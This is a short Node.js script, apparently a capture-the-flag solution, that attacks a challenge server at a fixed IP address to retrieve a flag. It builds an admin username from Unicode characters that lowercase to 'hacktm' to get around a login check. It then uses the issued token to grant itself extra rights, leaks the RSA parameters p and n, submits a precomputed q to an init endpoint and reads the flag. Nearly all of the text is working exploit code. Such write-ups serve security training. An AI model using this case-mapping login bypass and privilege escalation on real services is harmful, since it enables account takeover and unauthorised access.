var admin = "hacktm"

for (const c of admin) {
  for (let i = 0; i < 0x10000; i++) {
    let test = String.fromCharCode(i)
    if (test.toLowerCase() == c && test.toUpperCase() !== c.toUpperCase()) {
      admin = admin.replace(c, test)
    }
  }
}

var axios = require('axios') // sudo npm install axios

axios.post('http://167.172.165.153:60001/login', {
  username: admin
})
.then(function(response) {
  var token = response.data.data.token
  var headers = {
    "Authorization": "Bearer " + token
  } // JWT convention

  axios.post('http://167.172.165.153:60001/updateUser', {
    rights: [["port"], ["p"], ["n"]]
  }, {
    headers: headers
  })
  .then(function(response) {
    axios.get('http://167.172.165.153:60001/serverInfo', {
      headers: headers
    })
    .then(res => {
      var info = res.data.data.info
      var p, n

      info.forEach(e => {
        if (e.name == "p") {
          p = e.value
        }
        if (e.name == "n") {
          n = e.value
        }
      })

      // n // p in Python
      var q = "283463585975138667365296941492014484422030788964145259030277643596460860183630041214426435642097873422136064628904111949258895415157497887086501927987"
      
      axios.post('http://167.172.165.153:60001/init', {
        p: p,
        q: q
      })
      .then(function(response) {
        token = response.data.data.token
        headers = {
          "Authorization": "Bearer " + token
        }
        
        axios.get('http://167.172.165.153:60001/flag', {
          headers: headers
        })
        .then(function(response) {
          console.log(response.data.data.flag)
        })
      })
    })
  })
})
